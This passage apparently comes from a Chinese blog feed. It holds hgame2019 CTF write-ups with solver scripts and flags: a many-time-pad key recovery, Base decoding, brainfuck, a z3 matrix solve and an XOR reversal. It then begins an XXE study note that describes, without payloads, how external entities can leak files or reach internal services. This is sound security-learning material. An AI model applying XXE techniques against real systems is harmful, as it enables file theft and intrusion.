class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> enumerate(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">target_plaintext = <span class="string">&quot;OTP_is_not_safe_if_more_than_once&quot;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line"><span class="keyword">print</span> target_plaintext+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">    <span class="keyword">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nPrivate key recovered: &quot;</span>+key+<span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><p>通过修补很容易得到flag，再验证，基本上很快可以得到正确结果。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fix this sentence:</span><br><span class="line">*TP_:s_not_safe_if_more_tha&amp;_once</span><br><span class="line"></span><br><span class="line">Fixed:</span><br><span class="line">OTP_is_not_safe_if_more_than_once</span><br><span class="line"></span><br><span class="line">Decrypted msg:</span><br><span class="line">When we two parted In silence and</span><br><span class="line">Half broken hearted To sever for </span><br><span class="line">Pale grew thy cheek and cold Cold</span><br><span class="line">Truly that hour foretold Sorrow t</span><br><span class="line">The dew of the morning Sunk chill</span><br><span class="line">It felt like the warning Of what </span><br><span class="line">Thy vows are all broken And light</span><br><span class="line">I hear thy name spoken And share </span><br><span class="line">They name thee before me A knell </span><br><span class="line">A shudder comes o er me Why wert </span><br><span class="line">They know not I knew thee Who kne</span><br><span class="line">long long shall I rue thee Too de</span><br><span class="line">In secret we met In silence I gri</span><br><span class="line">That thy heart could forget Thy s</span><br><span class="line">If I should meet thee After ling </span><br><span class="line">How should I greet thee With sile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;OTP_is_not_safe_if_more_than_once&#125;</span><br></pre></td></tr></table></figure><h2 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h2><blockquote><p>描述<br>全家老小<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt</a></p></blockquote><p>多种base组合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url).text</span><br><span class="line"></span><br><span class="line">steps = []</span><br><span class="line">url = <span class="string">&quot;http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] Downloading encrypted file...&quot;</span></span><br><span class="line">p = download(url)</span><br><span class="line">n = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Base16</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base16 deocde&quot;</span></span><br><span class="line">        n = base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">16</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Base32</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base32 deocde&quot;</span></span><br><span class="line">        n = base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">32</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Base64</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[?] using base64 deocde&quot;</span></span><br><span class="line">        n = base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %s&quot;</span> % (n)</span><br><span class="line">        steps.append(<span class="number">64</span>)</span><br><span class="line">        p = n</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] flag found : %s&quot;</span> % (n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] steps : %s&quot;</span> % (steps)</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC</span><br></pre></td></tr></table></figure><p><a href="http://lenschulwitz.com/base58">http://lenschulwitz.com/base58</a> ，最后得到结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Pro的Python教室-一"><a href="#Pro的Python教室-一" class="headerlink" title="Pro的Python教室(一)"></a>Pro的Python教室(一)</h2><blockquote><p>描述<br>Easiest Python Challenge!<br>URL <a href="http://plqbnxx54.bkt.clouddn.com/first.py">http://plqbnxx54.bkt.clouddn.com/first.py</a></p></blockquote><p>不知道该怎怎么说，因为直接给出源码，太简单了==</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Here_1s_3asy_Pyth0n&#125;</span><br></pre></td></tr></table></figure><h2 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h2><blockquote><p>描述<br>Welcoooooome!<br>URL <a href="http://plps4kyke.bkt.clouddn.com/HelloRe">http://plps4kyke.bkt.clouddn.com/HelloRe</a></p></blockquote><p>IDA打开，<code>Shift+F12</code>得到结果：</p><p><img src="https://i.loli.net/2019/01/31/5c52e91da3cdc.png"></p><p>回头看一眼代码，逻辑很简单：</p><p><img src="https://i.loli.net/2019/01/31/5c52e9a0f34e3.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Welc0m3_t0_R3_World!&#125;</span><br></pre></td></tr></table></figure><h2 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h2><blockquote><p>描述<br>Ouch! What is this? I don’t think that I am pretty good at C++, what a brain fxxker it is!<br>学习资料:<br><a href="https://zh.wikipedia.org/wiki/Brainfuck">https://zh.wikipedia.org/wiki/Brainfuck</a><br><a href="https://zh.wikipedia.org/zh/ASCII">https://zh.wikipedia.org/zh/ASCII</a><br>读懂我的代码逻辑答案就出来了<br>补充说明:<br>判定答案是否正确的是 Notice 2，即“不执行 [+.] 这个部分”，不要单纯看有没有输出 orz<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp">http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp</a></p></blockquote><p>解这个题，需要对brainfuck的逻辑有一定的理解才行。参考<a href="https://zh.wikipedia.org/wiki/Brainfuck">https://zh.wikipedia.org/wiki/Brainfuck</a> </p><p>BF语言有两个字节流</p><blockquote><p>一个以字节为单位、被初始化为零的<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E7%BB%84">数组</a>、一个指向该数组的<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E9%92%88">指针</a>（初始时指向数组的第一个字节）、以及用于输入输出的两个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>。</p></blockquote><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td><code>&gt;</code></td><td>指针加一</td></tr><tr><td><code>&lt;</code></td><td>指针减一</td></tr><tr><td><code>+</code></td><td>指针指向的字节的值加一</td></tr><tr><td><code>-</code></td><td>指针指向的字节的值减一</td></tr><tr><td><code>.</code></td><td>输出指针指向的单元内容（<a href="https://zh.wikipedia.org/wiki/ASCII%E7%A0%81">ASCII码</a>）</td></tr><tr><td><code>,</code></td><td>输入内容到指针指向的单元（ASCII码）</td></tr><tr><td><code>[</code></td><td>如果指针指向的单元值为零，向后跳转到对应的<code>]</code>指令的次一指令处</td></tr><tr><td><code>]</code></td><td>如果指针指向的单元值不为零，向前跳转到对应的<code>[</code>指令的次一指令处</td></tr></tbody></table><p>于是这段C++代码实际上就是BF的C++实现，而本题的关键是这段BF代码（以<code>[+.]</code>分割开）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]   </span><br><span class="line">,&gt;+++++++++[&lt;---------&gt;-]&lt;-[+.]</span><br><span class="line">,&gt;+++++++[&lt;-------&gt;-]&lt;---[+.]</span><br><span class="line">,&gt;++++++[&lt;------&gt;-]&lt;+++[+.]</span><br><span class="line">,&gt;++++++++[&lt;----------&gt;-]&lt;++[+.]</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;--[+.]</span><br><span class="line">,&gt;++++++++++[&lt;--------&gt;-]&lt;-----[+.]</span><br><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;+[+.]</span><br><span class="line">,&gt;+++++++++[&lt;--------&gt;-]&lt;---[+.]</span><br></pre></td></tr></table></figure><p>首先，为什么<code>[+.]</code>会报错？</p><blockquote><p>因为</p><p>[ ：如果指针指向单元值不为0，loop开始</p><p>+.：字节指针+1输出，但是该指针并没有指向任何数据，故报错</p><p>] ：循环结束</p></blockquote><p>那么若想<code>[+.]</code>不报错，则需要<code>[</code>之前的指针单元为0</p><p>以第一段为例(之后同理不做赘述)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">,输入</span><br><span class="line">&gt;指针右移</span><br><span class="line">++++++++++循环变量设置为10</span><br><span class="line">[loop</span><br><span class="line">&lt;指针左移，指向输入的值</span><br><span class="line">----------输入变量减10</span><br><span class="line">&gt;指针右移，指向循环变量</span><br><span class="line">-循环变量减1</span><br><span class="line">（总共减了10次）</span><br><span class="line">]判断循环是否结束</span><br><span class="line"></span><br><span class="line">&lt;指针左移，指向输入变量</span><br><span class="line">++输入变量加2</span><br><span class="line">[+.]&#x3D; 0</span><br><span class="line">----------------------华丽的分割线-------------------</span><br><span class="line">x - 100 + 2 &#x3D; 0</span><br><span class="line">x &#x3D; 98chr(98)&#x3D; b</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;bR4!NfUcK&#125;</span><br></pre></td></tr></table></figure><h2 id="わかります"><a href="#わかります" class="headerlink" title="わかります"></a>わかります</h2><blockquote><p>描述<br>POSITION ZERO!<br>URL <a href="http://plps4kyke.bkt.clouddn.com/wakarimasu">http://plps4kyke.bkt.clouddn.com/wakarimasu</a></p></blockquote><p>main函数逻辑简单：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202221147.png"></p><p>输入一个值，然后通过一个函数判定是否符合要求。</p><p>但是这个函数稍稍复杂一点</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202224118.png"></p><p>将输入字符串简单处理以后得到<code>v7</code>和<code>ptr</code>，然后与一个预定义的数组<code>OrginalArr</code>通过两个函数得到v8，v9</p><p>最后判断v8必须与数组<code>arr1</code>,v9必须与数组<code>arr2</code>相等。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190202224337.png"></p><p>func1是两个三维矩阵的乘，func2是两个二维矩阵的加法，z3约束</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target1 = [<span class="number">122</span>, <span class="number">207</span>, <span class="number">140</span>, <span class="number">149</span>, <span class="number">142</span>, <span class="number">168</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">95</span>,  <span class="number">201</span>, <span class="number">122</span>, <span class="number">145</span>, <span class="number">136</span>, <span class="number">167</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">112</span>, <span class="number">192</span>, <span class="number">127</span>, <span class="number">137</span>, <span class="number">134</span>, <span class="number">147</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">95</span>, <span class="number">207</span>, <span class="number">110</span>, <span class="number">134</span>, <span class="number">133</span>, <span class="number">173</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">136</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">162</span>, <span class="number">152</span>, <span class="number">179</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">121</span>, <span class="number">193</span>, <span class="number">126</span>, <span class="number">126</span>, <span class="number">119</span>, <span class="number">147</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">token = [<span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">3</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">7</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, </span><br><span class="line"></span><br><span class="line">         <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target2 = [<span class="number">16</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, </span><br><span class="line"></span><br><span class="line">           <span class="number">5</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">23</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">14</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">4</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">22</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">6</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, </span><br><span class="line"></span><br><span class="line">   <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk2 = [<span class="number">8</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">b = BitVec(<span class="string">&#x27;b&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">c = BitVec(<span class="string">&#x27;c&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">d = BitVec(<span class="string">&#x27;d&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">e = BitVec(<span class="string">&#x27;e&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">f = BitVec(<span class="string">&#x27;f&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">    solve((a &gt;&gt; <span class="number">4</span>) * token[k] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span>] == target1[j],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">1</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">1</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">1</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">1</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">1</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">1</span>] == target1[j + <span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">2</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">2</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">2</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">2</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">2</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">2</span>] == target1[j + <span class="number">2</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">3</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">3</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">3</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">3</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">3</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">3</span>] == target1[j + <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">4</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">4</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">4</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">4</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">4</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">4</span>] == target1[j + <span class="number">4</span>],</span><br><span class="line"></span><br><span class="line">(a &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">5</span>] + (b &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">6</span> + <span class="number">5</span>] + (c &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">12</span> + <span class="number">5</span>] + (d &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">18</span> + <span class="number">5</span>] + (e &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">24</span> + <span class="number">5</span>] + (f &gt;&gt; <span class="number">4</span>) * token[k + <span class="number">30</span> + <span class="number">5</span>] == target1[j + <span class="number">5</span>],</span><br><span class="line"></span><br><span class="line">a &amp; <span class="number">0xf</span> == chunk2[p], b &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">1</span>], c &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">2</span>], d &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">3</span>], e &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">4</span>], f &amp; <span class="number">0xf</span> == chunk2[p + <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">    j += <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    p += <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 123, b = 103, a = 104, c = 97, d = 109, e = 101]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 110, b = 95, a = 49, c = 116, d = 104, e = 105]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 114, b = 95, a = 107, c = 77, d = 97, e = 116]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 95, b = 120, a = 49, c = 95, d = 105, e = 115]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 117, b = 101, a = 118, c = 114, d = 121, e = 95]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[f = 125, b = 101, a = 115, c = 102, d = 53, e = 108]</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="number">104</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">49</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">49</span>,<span class="number">120</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">108</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">qwer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> flag:</span><br><span class="line"></span><br><span class="line">    qwer += chr(q)</span><br><span class="line"></span><br><span class="line">print(qwer)</span><br><span class="line"><span class="comment">#hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span></span><br></pre></td></tr></table></figure><p>这题对我们这种REbeginner来说很不友好==、</p><h2 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h2><blockquote><p>描述<br>论r 与 xor 的重要性 ida里奇怪的大数字?不如按r试一试<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/xor">http://plir4axuz.bkt.clouddn.com/hgame2019/xor</a></p></blockquote><p>IDA打开，选中长数字按<code>r</code>可以将其转成字符</p><p><img src="https://i.loli.net/2019/02/19/5c6bfd7c4d00a.png"></p><p>从有往左读，可以发现这个是一个flag，但是不可能这么简单，没错，这是<code>fake_flag</code>，==、</p><p><code>memset(void *s, int ch,size_t n)</code>需要注意，这个是初始化函数，将s后面n个字节都初始化成ch。</p><p>于是得到<code>0x90/4=144/4=36</code>。即将v6开始后面36个int都初始化为0。作为<code>REbeginner</code>我以为这里除了问题，因为给出的变量不足36个，但是后来经大佬提醒发现，这个要看定义的变量所占的内存，</p><p>一个int是4位，但是<code>v7(bp-118h)</code>和<code>v8(bp-110h)</code>差了8位，就是说，v7和v8之间有两个int，一个是v7,一个是之前初始化的0，之后同理，可以推测出所有的36位数组序列。</p><p><img src="https://i.loli.net/2019/02/19/5c6c021659d83.png"></p><p><img src="https://i.loli.net/2019/02/19/5c6c03a68c893.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,</span><br><span class="line">0,66,85,126,72,85,30,0]</span><br></pre></td></tr></table></figure><p>之后的就简单了，看一下代码逻辑，很简单的异或，再异或一下就可以得到真正的flag</p><p><img src="https://i.loli.net/2019/02/19/5c6c0469ca211.png"></p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &#39;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&#39;</span><br><span class="line">v &#x3D; [0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30,0]</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,35):</span><br><span class="line">flag +&#x3D; chr(ord(s[i])^v[i])</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">## hgame&#123;X0r_1s_interest1ng_isn&#39;t_it?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习笔记</title>
      <link href="/2019/01/20/XXE-note/"/>
      <url>/2019/01/20/XXE-note/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 <strong>外部实体</strong> ，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（相反，单纯的XML注入比较鸡肋。）</p><blockquote><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p></blockquote><h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h2><p>以下内容主要参考<a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></p><p>要了解XXE，首先要了解XML标记语言。XML标记语言有哪些特征呢？</p><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<strong>标记语言</strong>，很类似 HTML</li><li>XML 的设计宗旨是<strong>传输数据</strong>，而非显示数据</li><li>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。</li><li>XML 被设计为具有<strong>自我描述性</strong>。</li></ul><p>XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML文档用途广泛，最常见的比如订阅一个网站时的<code>rss.xml</code>等。XML本质上就是一段<strong>自我描述的数据</strong>。XML是一种树结构。语法参考链接<a href="http://www.w3school.com.cn/xml/xml_syntax.asp">http://www.w3school.com.cn/xml/xml_syntax.asp</a></p><p>重点语法规则主要有这样几点：</p><ul><li><p>所有 XML 元素都须有关闭标签</p></li><li><p>XML 标签对大小写敏感</p></li><li><p>XML 必须正确地嵌套</p></li><li><p>XML 文档必须有根元素</p></li><li><p>XML 的属性值须加引号</p></li><li><p>如果你把字符 “&lt;” 放在 XML 